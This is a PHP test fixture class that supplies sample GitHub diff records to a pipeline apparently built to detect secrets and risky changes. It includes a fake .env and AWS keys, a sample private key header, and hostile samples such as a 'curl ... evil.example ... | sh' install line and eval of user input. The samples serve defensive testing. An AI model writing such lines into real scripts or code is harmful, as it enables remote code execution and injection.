<?php

declare(strict_types=1);

namespace Tests\Support;

/**
 * Static fixtures of GitHub Files API records (file_path, raw_patch,
 * is_binary, status) used by the analysis pipeline tests.
 *
 * Deliberately a static class (no global functions) so Pest never hits
 * "Cannot redeclare" across test files sharing the same process.
 */
final class DiffFixtures
{
    public static function benignPhpDiff(): array
    {
        return [
            'file_path' => 'app/Http/Controllers/HomeController.php',
            'raw_patch' => "@@ -1,3 +1,4 @@\n+public function index()\n+{\n+    return view('home');\n+}\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function exposedDotEnvSecret(): array
    {
        return [
            'file_path' => '.env',
            'raw_patch' => "@@ -1,4 +1,5 @@\n+APP_KEY=base64:abc\n+DB_PASSWORD=secret-password\n+API_KEY=\"sk-live-1234567890abcdef\"\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function awsKeyInConfig(): array
    {
        return [
            'file_path' => 'config/aws.php',
            'raw_patch' => "@@ -5,6 +5,7 @@\n+        'key' => 'AKIAIOSFODNN7EXAMPLE',\n+        'secret' => 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function privateKeyPem(): array
    {
        return [
            'file_path' => 'deploy/id_rsa.pem',
            'raw_patch' => "@@ -0,0 +1,5 @@\n+-----BEGIN RSA PRIVATE KEY-----\n+MIIEowIBAAKCAQEA...\n+-----END RSA PRIVATE KEY-----\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function embeddedJwt(): array
    {
        $jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';

        return [
            'file_path' => 'app/Services/TokenHelper.php',
            'raw_patch' => "@@ -1,3 +1,4 @@\n+    private const TOKEN = '{$jwt}';\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function evalDanger(): array
    {
        return [
            'file_path' => 'app/Helpers/Evaluator.php',
            'raw_patch' => "@@ -1,3 +1,5 @@\n+    eval(\$userInput);\n+    shell_exec('whoami');\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function curlPipeSh(): array
    {
        return [
            'file_path' => 'scripts/install.sh',
            'raw_patch' => "@@ -0,0 +1,3 @@\n+#!/bin/sh\n+curl -sSL https://evil.example/install.sh | sh\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function chmod777(): array
    {
        return [
            'file_path' => 'scripts/deploy.sh',
            'raw_patch' => "@@ -5,6 +5,7 @@\n+chmod 777 /var/www/storage\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function composerDowngrade(): array
    {
        return [
            'file_path' => 'composer.json',
            'raw_patch' => "@@ -10,7 +10,7 @@\n-        \"acme/lib\": \"^2.0.1\",\n+        \"acme/lib\": \"^1.9.0\",\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function packageLockDowngrade(): array
    {
        return [
            'file_path' => 'package-lock.json',
            'raw_patch' => "@@ -20,9 +20,9 @@\n-    \"name\": \"acme/lib\",\n-    \"version\": \"2.0.1\",\n+    \"name\": \"acme/lib\",\n+    \"version\": \"1.9.0\",\n",
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function sensitiveCredentialsJson(): array
    {
        return [
            'file_path' => 'config/credentials.json',
            'raw_patch' => "@@ -0,0 +1,3 @@\n+{\n+  \"client_secret\": \"a-client-secret-value\"\n+}\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function sqlDump(): array
    {
        return [
            'file_path' => 'database/dump.sql',
            'raw_patch' => "@@ -0,0 +1,4 @@\n+INSERT INTO users (email, password_hash) VALUES ('a@b.com', 'hash');\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function vendorFile(): array
    {
        return [
            'file_path' => 'vendor/laravel/framework/src/Illuminate/Support/helpers.php',
            'raw_patch' => "@@ -1,3 +1,4 @@\n+function helper() {}\n",
            'is_binary' => false,
            'status' => 'added',
        ];
    }

    public static function hugeLockfile(int $packages = 500): array
    {
        $parts = ['{', '    "packages": ['];

        for ($i = 0; $i < $packages; $i++) {
            $parts[] = '        {';
            $parts[] = '            "name": "acme/package-'.$i.'",';
            $parts[] = '            "version": "1.'.$i.'.0",';
            $parts[] = '        },';
        }

        $parts[] = '    ]';
        $parts[] = '}';

        return [
            'file_path' => 'composer.lock',
            'raw_patch' => "@@ -1,4 +1,4 @@\n".implode("\n", $parts),
            'is_binary' => false,
            'status' => 'modified',
        ];
    }

    public static function binaryRecord(): array
    {
        return [
            'file_path' => 'assets/logo.png',
            'raw_patch' => null,
            'is_binary' => true,
            'status' => 'added',
        ];
    }
}
